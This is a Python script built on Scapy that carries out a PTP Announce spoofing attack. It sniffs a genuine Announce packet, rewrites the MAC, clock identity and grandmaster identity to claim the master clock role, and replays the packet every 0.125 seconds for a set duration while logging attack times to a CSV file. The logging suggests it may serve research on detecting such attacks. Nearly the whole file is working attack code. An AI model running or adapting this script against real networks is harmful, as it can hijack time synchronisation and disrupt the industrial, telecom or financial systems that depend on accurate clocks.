import os
import time
import argparse
from functools import partial
from scapy.all import *
from AnnouncePTP import *
from scapy.all import Ether
import csv


def get_mac_address(interface):
    try:
        output = os.popen('ifconfig ' + interface).read()
        mac_address_index = output.find('ether ') + 6
        mac_address = output[mac_address_index:mac_address_index+17]
        return mac_address
    except Exception as e:
        return "Error:", e


def get_clock_identity(mac_address, type_info):
    mac_address_str_no_colon = mac_address.replace(':', '')

    byte_string = bytes.fromhex(mac_address_str_no_colon)

    half_length = len(byte_string) // 2
    first_half = byte_string[:half_length]
    second_half = byte_string[half_length:]
    byte_string_with_extra_bytes = ''
    if type_info == 'id':
        byte_string_with_extra_bytes = first_half + b'\xff\xff' + second_half
    elif type_info == 'master':
        byte_string_with_extra_bytes = first_half + b'\xff\xfe' + second_half
    return byte_string_with_extra_bytes


def log_attack_start_end(attack_type, start_time, end_time, filename):
    # Open the file in append mode
    with open(filename, mode='a', newline='') as file:
        writer = csv.writer(file)
        writer.writerow([attack_type, start_time, end_time])


def announce_filter(packet, interface, duration, logs):
    if Ether in packet:
        if packet[Ether].type == 35063:
            if packet[0].load[0] == 11:
                print('Start Round')
                new_announce = AnnouncePTP(packet)
                mac_address = get_mac_address(interface)
                clock_ID = get_clock_identity(mac_address, 'id')
                master_ID = get_clock_identity(mac_address, 'master')
                new_announce.new_Ether_src(mac_address)
                new_announce.new_ClockIdentity(clock_ID)
                new_announce.new_grandmasterClockIdentity(master_ID)
                start_time = time.time()
                send_packets(new_announce, interface, duration)
                end_time = time.time()
                # Log the start and end times
                log_attack_start_end("Announce_Attack", start_time, end_time, logs)
                print(f"Logged Announce_Attack start: {start_time} and end: {end_time} to CSV file successfully.")
                print('End round')
                return True
            else:
                print("WAITING FOR ANNOUNCE PACKET")
        else:
            print("WAITING FOR ANNOUNCE PACKET")


def send_packets(packet, interface, duration=None):
    start_time = time.time()
    current_time = time.time()
    while current_time - start_time < duration:
        seqID = int.from_bytes(packet.ptp_layer[30:32], byteorder='big') + 1
        new_seqID = seqID.to_bytes((seqID.bit_length() + 7) // 8, byteorder='big')
        packet.ptp_layer = packet.ptp_layer[:30] + new_seqID + packet.ptp_layer[32:]
        packet.packet = packet.eth_layer / packet.ptp_layer
        sendp(packet.packet, iface=interface, verbose = False)
        time.sleep(0.125)
        current_time = time.time()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-s", "--sleep", help="specify the sleep time", type=int, default=0)
    parser.add_argument("-d", "--duration", help="specify the duration of the attack", type=int, default=600)
    parser.add_argument("-i", "--interface", help="specify the interface", type=str, default='enp4s0')
    parser.add_argument("-l", "--logs", help="specify the number of attack rounds", type = str)

    args = parser.parse_args()


    sniffer = partial(announce_filter, interface=args.interface, duration=int(args.duration),logs = args.logs)
    sniff(iface=args.interface, stop_filter=sniffer)
    time.sleep(args.sleep)

